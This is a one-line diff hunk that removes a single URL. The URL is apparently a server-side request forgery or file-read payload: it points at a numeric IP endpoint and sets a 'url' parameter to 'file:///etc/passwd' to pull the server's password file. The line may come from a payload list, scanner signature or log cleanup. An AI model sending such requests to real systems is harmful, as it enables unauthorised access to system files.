@@ -1,1 +1,0 @@
-http://154.31.6.42:2539/pay/xinhui/request_post?url=file:///etc/passwd&post_data[1]=
